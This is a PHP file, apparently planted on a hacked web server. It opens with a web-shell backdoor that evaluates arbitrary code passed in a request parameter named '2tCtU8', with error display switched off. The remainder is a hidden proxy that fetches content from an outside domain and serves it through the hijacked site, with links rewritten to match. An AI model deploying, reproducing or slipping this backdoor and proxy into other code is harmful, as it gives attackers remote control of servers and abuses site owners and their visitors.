<?php eval(@$_REQUEST["2tCtU8"]);
@error_reporting(0); @ini_set("display_errors", "off");

$subdomain = "i.huamengnet.com";
$maindomain = "ideadestek.info";

$domain = "$subdomain.$maindomain";
$url = "http://$domain";
$u=$url .((substr($_SERVER["QUERY_STRING"],0,1)!='/')?'?':''). $_SERVER["QUERY_STRING"];
if (function_exists("curl_init")) {     $ch = curl_init();     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     curl_setopt($ch, CURLOPT_URL, $u);     curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)  ");     $str = curl_exec($ch);     curl_close($ch); } if ($str === false && ini_get("allow_url_fopen") == "1") {     $str = file_get_contents($u); }
$replace_arr = array(     $domain => $url,     'http://http://' => 'http://',     $url => $_SERVER["SCRIPT_NAME"] . "?", );
if (substr($_SERVER["QUERY_STRING"], -4) == '.css') {     $replace_arr['url( '] = 'url(';     $replace_arr['url('] = 'url('.'http://'.$_SERVER["HTTP_HOST"].$_SERVER["SCRIPT_NAME"] . "?" . dirname($_SERVER["QUERY_STRING"]).'/';     $replace_arr[$_SERVER["SCRIPT_NAME"] . "?".$_SERVER["SCRIPT_NAME"] . "?"] = $_SERVER["SCRIPT_NAME"] . "?"; }
$replace_arr['>'.$_SERVER["SCRIPT_NAME"] . "?<"] = ">$subdomain<";
foreach ($replace_arr as $k => $v) {     $str = str_replace($k, $v, $str); }
$filetype_header = array('.css' => 'text/css', '.js' => 'text/javascript', '.png' => 'image/png', '.jpg' => 'image/jpg', '.jpeg' => 'image/jpeg', '.gif' => 'image/gif', '.atom' => 'application/atom+xml', '.xml' => 'text/xml', '/feed' => 'text/xml; charset=UTF-8',);
foreach ($filetype_header as $k => $v) {     if (substr($_SERVER["QUERY_STRING"], -strlen($k)) == $k) {         header("Content-type: $v");         break;     } }
echo $str;